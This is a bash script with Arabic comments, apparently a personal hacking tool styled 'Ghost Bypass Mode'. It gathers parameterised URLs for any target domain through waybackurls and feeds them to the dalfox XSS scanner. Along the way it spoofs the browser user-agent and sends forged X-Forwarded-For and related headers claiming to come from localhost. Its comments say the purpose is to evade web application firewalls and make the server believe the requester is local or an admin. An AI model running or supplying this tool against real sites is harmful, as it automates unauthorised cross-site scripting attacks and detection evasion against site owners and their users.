#!/bin/bash

# الألوان
G='\033[0;32m'
R='\033[0;31m'
Y='\033[1;33m'
C='\033[0;36m'
NC='\033[0m'

banner() {
    clear
    echo -e "${C}    ██████  ███████ ██   ██ ███████ ███████ "
    echo "    ██   ██ ██       ██ ██  ██      ██      "
    echo "    ██████  █████     ███   ███████ ███████ "
    echo "    ██   ██ ██       ██ ██       ██      ██ "
    echo "    ██████  ███████ ██   ██ ███████ ███████ "
    echo -e "    ${Y}   GHOST BYPASS MODE | BY: FAISAL${NC}"
    echo -e "    ${G}Status: Undetectable (Anti-WAF)${NC}"
    echo -e "    ${R}--------------------------------------------${NC}"
}

banner
read -p "[?] Enter Target Domain: " target
[ -z "$target" ] && exit 1

# 1. جمع الروابط وتنظيفها بعناية
echo -e "${Y}[*] Gathering and cleaning URLs...${NC}"
rm -f xss_targets.txt
waybackurls $target | grep "?" | grep -vE "\.(jpg|jpeg|png|gif|css|js|woff|svg|pdf|mp4|zip)" | sort -u > xss_targets.txt

if [ ! -s xss_targets.txt ]; then
    echo -e "${R}[X] No targets found!${NC}"; exit 1
fi

echo -e "${G}[+] Found $(wc -l < xss_targets.txt) potential parameters.${NC}"

# 2. تشغيل Dalfox بكل إمكانيات التخطي
echo -e "${Y}[!] Starting Ghost Bypass Attack...${NC}"

# شرح الإضافات الجديدة للتخطي:
# --user-agent: استخدام متصفح حديث جداً
# --delay 500: تأخير نصف ثانية بين كل طلب (آمن جداً)
# --mining-dict: البحث عن برامترات مخفية في الـ DOM
# --follow-redirects: تتبع التحويلات إذا كان الموقع يحولك لصفحة ثانية
# --header: إضافة هيدرز تخدع السيرفر وتوهمه إنك أدمن أو إن الطلب محلي (Localhost)

cat xss_targets.txt | dalfox pipe --worker 2 --delay 500 \
--user-agent "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36" \
--header "X-Forwarded-For: 127.0.0.1" \
--header "X-Originating-IP: 127.0.0.1" \
--header "X-Real-IP: 127.0.0.1" \
--header "X-Client-IP: 127.0.0.1" \
--header "Forwarded: for=127.0.0.1;by=127.0.0.1" \
--follow-redirects \
--mining-dict \
--output "xss_ghost_results_$target.txt"

echo -e "\n${G}[✓] Scan Finished! Results saved in xss_ghost_results_$target.txt${NC}"
